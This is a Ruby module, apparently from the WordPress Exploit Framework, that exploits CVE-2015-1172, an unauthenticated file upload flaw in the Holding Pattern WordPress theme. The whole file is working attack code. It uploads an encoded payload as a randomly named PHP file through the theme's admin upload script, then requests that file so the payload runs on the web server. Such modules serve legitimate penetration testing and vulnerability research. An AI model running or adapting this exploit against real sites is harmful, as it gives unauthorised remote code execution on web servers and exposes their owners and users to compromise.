require 'socket'

class Wpxf::Exploit::HoldingPatternShellUpload < Wpxf::Module
  include Wpxf
  include Wpxf::Net::HttpClient
  include Wpxf::WordPress::Fingerprint
  include Wpxf::WordPress::Options
  include Wpxf::WordPress::Urls

  def initialize
    super

    update_info(
      name: 'Holding Pattern Theme Shell Upload',
      desc: 'This module exploits a file upload vulnerability in all versions '\
            'of the Holding Pattern theme found in the upload_file.php script '\
            'which contains no session or file validation. It allows '\
            'unauthenticated users to upload files of any type and '\
            'subsequently execute PHP scripts in the context of the '\
            'web server.',
      author: [
        'Alexander Borg',                 # Vulnerability disclosure
        'Rob Carr <rob[at]rastating.com>' # WPXF module
      ],
      references: [
        ['CVE', '2015-1172'],
        ['WPVDB', '7784']
      ],
      date: 'Feb 11 2015'
    )
  end

  def check
    check_theme_version_from_readme('holding_pattern')
  end

  def plugin_url
    normalize_uri(wordpress_url_themes, 'holding_pattern')
  end

  def holding_pattern_uploads_url
    normalize_uri(plugin_url, 'uploads/')
  end

  def holding_pattern_uploader_url
    normalize_uri(plugin_url, 'admin', 'upload-file.php')
  end

  def payload_body_builder(payload_name)
    target_ip = IPSocket.getaddress(target_host)
    field_name = Utility::Text.md5(target_ip)

    builder = Utility::BodyBuilder.new
    builder.add_file_from_string(field_name, payload.encoded, payload_name)
    builder
  end

  def run
    super
    return false unless check_wordpress_and_online

    emit_info 'Preparing payload...'
    payload_name = "#{Utility::Text.rand_alpha(10)}.php"
    builder = payload_body_builder(payload_name)

    emit_info 'Uploading payload...'
    res = nil
    builder.create do |body|
      res = execute_post_request(url: holding_pattern_uploader_url, body: body)
    end

    if res.nil?
      emit_error 'No response from the target'
      return false
    end

    if res.code != 200
      emit_error "Server responded with code #{res.code}"
      return false
    end

    payload_url = normalize_uri(holding_pattern_uploads_url, payload_name)
    emit_success "Uploaded the payload to #{payload_url}", true

    emit_info 'Executing the payload...'
    res = execute_get_request(url: payload_url)

    if res && res.code == 200 && !res.body.empty?
      emit_success "Result: #{res.body}"
    end

    return true
  end
end
